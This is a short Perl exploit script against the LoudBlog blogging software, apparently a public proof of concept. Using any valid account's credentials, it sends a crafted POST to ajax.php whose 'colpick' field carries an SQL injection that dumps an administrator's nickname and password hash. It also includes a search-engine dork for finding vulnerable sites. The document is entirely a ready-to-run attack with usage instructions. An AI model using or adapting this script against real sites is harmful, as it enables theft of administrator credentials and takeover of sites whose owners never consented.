#!/usr/bin/perl
# This Exploit requires a valid user name and password of an account regardless of the permissions
#
# Author: Xianur0
# Affected: All Versions
# Bug: SQL Injection
# 
# Doorks:
#  allintext: "powered by LoudBlog"


  use HTTP::Request::Common qw(POST);
  use LWP::UserAgent;
  use Digest::MD5 qw(md5_hex);
  $ua = LWP::UserAgent->new;

print "\n             LoudBlog Exploit All Version By Xianur0\n\n";
$uri = $ARGV[0];
$id = $ARGV[1];
$password = $ARGV[3] || die("\nUse: loudblog.pl [URI] [ID Admin] [Valid User] [Valid Password]\n");
$md5 = md5_hex($ARGV[2]).":".md5_hex($password);

  my $req = POST $uri.'/loudblog/ajax.php',
                [ colpick => "concat(0x557365723a20,nickname,0x0d0a50617373776f72643a20,password)", rowpick => "id", rowval => $id, table => 'authors', action => 'singleread'];
$req->header('User-Agent' => 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17');
$req->header('Cookie' => 'lbauth='.$md5);
$res = $ua->request($req);
  print $res->content."\n"; 